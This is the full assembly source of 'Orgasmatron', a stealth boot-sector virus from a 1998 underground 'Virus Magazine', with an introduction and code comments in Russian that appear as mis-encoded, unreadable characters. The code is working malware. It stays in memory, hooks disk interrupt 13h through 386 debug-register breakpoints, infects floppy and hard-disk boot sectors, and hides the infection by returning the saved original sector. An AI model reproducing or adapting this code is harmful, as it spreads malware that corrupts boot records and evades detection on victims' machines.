COMMENT * //

      ��                  �
     ���  Virus Magazine  � Box 176, Kiev 210, Ukraine      IV   1998
     ��� ���������������� � ������������������� � ��������  ���������
      �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � � ��� �
       � � � ��  ��  �    �  ��  � �    � � � � � �   �     � � ��� �
       � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � � ��� �
       � ����������������� �������������������������������  ���������
          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

                             Orgasmatron

                     (c) Vecna & Eternal Maverick

      �⠪, ��। ���� �����⢥��� (?) � ᢮�� த� � 㭨����� ��⮢�
�����. ������ � ��� �᭮�� ���� - �ᯮ�짮����� �����⭮�� �३������
(�窨 ��⠭���) � �⫠����� ॣ���஢ �����஢ Intel 386 � ����.
      ���� ������� ��-� �������� ������ � ��㡥 �� 2 ��� 3 ����
�����, � ����� �� ࠭��� IV �뫠 ���� ����� ����饭��� �⮬�. ������,
�� �஥�� �� ��� ॠ����樨 ��諮 ����� �६���. ����, �� �� ���������
� ᮧ��� ����� ��� ����� ࠡ���� �����, �⠫ Vecna. � �祭�� 2 ��� 3
����楢 � ����뢠�� � ���� ������ ��� ����ᠭ�� ��㣨� ����ᮢ � �襭��
����������� �஡��� (���-� ᤠ� ��ᨩ, �����⮢�� �������, �����������)
�� ����� ࠧࠡ��뢠��, ��ࠡ��뢠��, ᮢ��襭�⢮���� � ��ࠢ�﫨
��室�� ⥪��, ����� �������� < 5 K� (��� �������ਥ� � 蠯��).
      ���, �� �⠫ 29A ���� 2 㦥 ����� ����-����� �⮣� �����. ��
� ᮦ������ ࠭�� ��㡫������� ��ਠ�� ��᮫�⭮ �������ᯮᮡ�� �
�ࠪ��᪨ ��ࠡ��ᯮᮡ��, ��� 㦥 ����祭 � ��⨢������ ����
��ᯥ�᪮�� (��祬 ?).
      ������ ���� ᫮� � 䠩���, ��室����� � �⮬ ��⠫���:

             ORG.ASM     - �������஢���� ��室���
             ORG.BOT     - ��� ��, ���� ���� �������஢���
             MAKE.BAT    - ������ 䠩� ��� �������樨
             EXE2COM.COM - ��� ��, � ���� ���
             INSTALL.ASM - ��室�� ⥪�� �ணࠬ��쪨 ��� ���⠫��樨 �
                           ���-ᥪ��
             CLEAN.ASM   - ��室�� ⥪�� �ணࠬ��쪨 ��� ���⪨
                           ���-ᥪ�� (���� ���-ᥪ�� ����室���
                           �।���⥫쭮 ������� � 䠩� NORMAL.BOT �
                           ⮬ �� ��⠫���, ��� CLEAN.COM)

      ������� ᥡ� �� ��᪮�쪮 ���� ����砭��:

- ORGASMATRON �� �।�⠢��� �� ᥡ� ����⥫쭮� �஧� ��� ���짮��⥫��
(� ��襬 ��᫥ �⮣� ᫮��) ��. ��ᬮ��� �� ࠡ��ᯮᮡ�����, ������⢨�
(?) �訡��, ᮢ���⨬���� � Windows 95 � QEMM (��� ���� �� ����ᠥ�, �� � ��
ࠡ�⠥�) � ���४��� ����㧪� �� 286, �� �ᥣ� ���� ��ᯥਬ��⠫쭠�
ࠧࠡ�⪠. �����⢥���� 楫��, ��᫥�����襩�� �� ����ᠭ�� �⮣� �����,
�뫮 ᮧ����� ��ᨢ��� � ������⭮�� ����.
- ������� � ��ᯥ�᪨� ����� �� ������� ORGASMATRON � ᢮� ��⨢�����
����, ⥬ �����, �� ��� �⮣� �� �ਤ���� ������� ᢮� �ࠣ�業��� �६�,
��ࢠ���� �� ᯮ஢ � ⮬, �� ���� ����ᠫ DrWeb �/��� AVP � ���稫��
��⥪�஢��� ����-������, � ��������� ��� ��㣠 ������.
- �� ���������, ᮮ�饭�� �� �訡��� � �।������� (����⥫쭮 ����� �
��室�� ⥪�⮬ :) � ��������ﬨ) ����� � �㦭� ���뫠�� �� ���� ��㡠.

                                                      Eternal Maverick

// *

.MODEL TINY
.CODE
.8086
ORG 0H

START   PROC
        jmp loco
        nop
ENDP    START

;----------------------------------
; ������� Boot Parameters Block
;----------------------------------

BPB     STRUC
bpb_oem db 8 dup (?)
bpb_b_s dw ?
bpb_s_c db ?
bpb_r_s dw ?
bpb_n_f db ?
bpb_r_e dw ?
bpb_t_s dw ?
bpb_m_d db ?
bpb_s_f dw ?
bpb_s_t dw ?
bpb_n_h dw ?
bpb_h_d dw ?
bpb_sht db 20h dup (?)
BPB     ENDS

BOOT    BPB <>

;------------------------------------
; ���� �⠭���⭠� ���� �����稪�,
; � ����뢠���� 1Kb �����
;------------------------------------
LOCO    PROC
        cli
        sub ax, ax
        mov ss, ax
        mov sp, 7c00h
        push cs
        pop ds
        dec word ptr ds:[413h]
        int 12h
        mov cl, 10
        ror ax, cl
        mov es, ax
;-----------------------------------
; �஢�ઠ �� ����� � ����� � ��
; ����室����� ����஢���� ���� �
; �� ᠬ� 1Kb
;-----------------------------------
        xor di, di
        mov si, sp
        mov cx, 0100h
        push es
        cmp byte ptr es:[di+mymark],'*'
        mov  ax, offset restore
        je   NoCopy
        rep movsw
        mov  ax, offset strtovr
NoCopy:
        push ax
        retf            ; ��।�� �ࠢ����� �� STRTOVR
ENDP    LOCO

STRTOVR PROC
;---------------------------------------
; ���墠� ���뢠��� 6, �⮡� �⫮����
; ����㧪� �� 286 � �� ��������...
;---------------------------------------
        mov  byte ptr cs:[i13InUse], 0
        push dword ptr ds:[6*4]
        mov word ptr ds:[6*4], offset is286orlower
        mov word ptr ds:[6*4+2], cs
.386P
;---------------------------------------
; ���࠭���� ���� 13h � ���墠� 1�h
;---------------------------------------
        mov  eax, dword ptr ds:[13h*4]       ; ���� ���� �⮩ ������樨
                                             ; ����� ��� 66h � ��뢠��
                                             ; Invalid Opcode �� 286
        mov  dword ptr cs:[old13], eax
        mov  eax, dword ptr ds:[1Ch*4]
        mov  dword ptr cs:[old1C],eax
        mov  word ptr ds:[1Ch*4],offset int1C
        mov  word ptr ds:[1Ch*4+2],cs
        jmp  installed
;-----------------------------------------
; ����㧪� �⠭���⭮�� ���-ᥪ�� � 
; ��।�� ��� �ࠢ����� (� ��砥 286
; �� � �᢮�������� 1�b �����)
;-----------------------------------------

.8086
is286orlower:
        inc word ptr ds:[413h]
installed:
        pop dword ptr ds:[6*4]  ; ����⠭������� int 6
        sti
restore:
        push ds
        pop  es

        xor ax, ax
        int 13h
        mov bx, 7c00h
        call SetForRead
        db 0eah
        dw 07c00h
        dw 0h
ENDP    STRTOVR

.386P

;----------------------------------
; ������ �ਣ����쭮�� ���-ᥪ��
; � "⠩��� ����" ��� ��� �⥭��
; ���㤠
;----------------------------------
SetForRead:
        mov ax, 0201h
SetCXDXDo13:
        push ax
        cmp dl, 80h
        jle harddrive
floppydrive:
        mov cx, word ptr es:[bx.bpb_r_e+3]
        shr cx, 4
        movzx ax, byte ptr es:[bx.bpb_n_f+3]
        mul word ptr es:[bx.bpb_s_f+3]
        add cx, ax
        inc cx
        sub cx, word ptr es:[bx.bpb_s_t+3]
        mov dh, 1
        jmp goexit
harddrive:
        mov ah, 8
        int 13h
        and cx, 0111111b
        mov dx,80h
goexit:
        pop ax
;-----------------------
;       �맮� 13h
;-----------------------
INT13:
        pushf
        db 9ah
old13   equ this dword
        dd ?
        ret

;-----------------------------------------
; ��⠭���� breakpoint � �८�ࠧ�������
; ���� � 32-� ࠧ�來� ���
;-----------------------------------------
SETDR   PROC
        push ds
        pushad
        push 0
        pop ds
        mov word ptr ds:[1*4], offset int1
        mov word ptr ds:[1*4+2], cs
        mov byte ptr cs:[change], 90h
        movzx eax, word ptr cs:[old13]
        movzx ebx, word ptr cs:[old13+2]
        shl ebx, 4
        add ebx, eax
        mov dr3, ebx
        mov eax, dr7
        or al, 010000000b
        mov dr7, eax
        popad
        pop ds
        ret
ENDP    SETDR

;--------------------------------------
;       ��ࠡ��稪 1�h
;--------------------------------------
INT1C   PROC
        cmp byte ptr cs:[i13InUse], 0   ; ������, �᫨ �� 0, �
                                        ; ��室���� ����� int 1
        jne int1isrunning
        call setdr
int1isrunning:
        db  0eah
old1C   dd ?
ENDP    INT1C

;--------------------------------------
;       ��ࠡ��稪 int 1
;--------------------------------------
INT1    PROC
;--------------------------------------
;       C��࠭���� � ���⪠ dr6
;--------------------------------------
        push eax
        mov eax, dr6
        mov dword ptr cs:[savedr6], eax
        xor eax, eax
        mov dr6, eax
        mov eax, dr7
        and al, not 010000000b
        mov dr7, eax
        pop eax
        nop             ; ��������� �� IRET �� ����室�����
change  equ byte ptr $-1
ENDP    INT1

DEBUG   PROC
        push eax
        push ds
        push cs
        pop ds
        inc byte ptr [i13InUse]         ; ���⠢��� 䫠���
;----------------------------------
;       �஢�ઠ �� �⥭��/������
;----------------------------------
        shr  ah,1
        cmp  ah,1
        jne  done                       ; �������� ⮫쪮 �� 2 � 3 � AH
;----------------------------------
        mov eax, -1                     ; � ��࠭���� dr6
savedr6 equ dword ptr $-4
        test ax, 0100000000001000b
        jz  done                      ; �஢�ઠ �� �������騥 ᮡ���
                                      ; (�᫮��� �맮�� INT 1 � �����
                                      ; breakpoint)
        mov byte ptr [change], 0cfh   ; ���⠢��� IRET, �⮡ �� ��ᯮ�����
;----------------------------------
;       �஢�ઠ �� ���饭�� �
;       ���-ᥪ���
;----------------------------------
        cmp cx, 1
        jne done
        cmp dl, 80h
        jg  floppy
        cmp dh,1
        je  bootaccess
        jmp short done
floppy:
        or  dh,dh
        jne done
bootaccess:
        pop ds
        pop eax
        add sp, 6
        call int13
        pushf
        push ax
        jc error

        cmp byte ptr es:[bx+offset mymark], '*' ; ��⪠ ��ࠦ������
mymark  equ byte ptr $-1
        je stealth                              ; �᫨ ��ࠦ��, �
                                                ; ��⠥��� ��᪨஢�����,
                                                ; �᫨ ��� - ��ࠦ���
;---------------------------------
;       ���࠭���� �ਣ����쭮��
;       ���-ᥪ��
;---------------------------------
        pusha
        mov ax, 0301h
        call setcxdxdo13
        popa
        jc error
;---------------------------------
;  ��७�� BPB � ������ ᥡ�
;---------------------------------
        pusha
        push es
        push ds
        push es
        pop ds
        push cs
        pop es
        mov di,offset boot
        lea si,[bx+3]
        mov cx,3bh
        cld
        rep movsb
        mov ax, 0301h
        xor bx,bx
        inc cx          ; CX=0 after REP MOVSB
        mov dh,0
        cmp dl,80h
        jg  floppydisk
        inc dh
floppydisk:
        call int13
        pop ds
        pop es
        popa
stealth:
;----------------------------------
;       ��⠥� �ਣ������ ᥪ��
;----------------------------------
        pusha
        call SetForRead
        popa
error:
        dec byte ptr cs:[i13InUse]      ; ����뢠�� 䫠�
        pop ax
        popf
        retf 2                          ; ��� � ��
done:
        dec byte ptr [i13InUse]
        pop ds
        pop eax
        iret
ENDP    DEBUG

i13InUse db -1                          ; ������

ORG 01FEH                               ; � �� ᬥ饭�� 01FEh ������ ����
                                        ; ��⪠ ���-ᥪ��
        db 55h,0aah

BUFFER  EQU THIS BYTE

END     START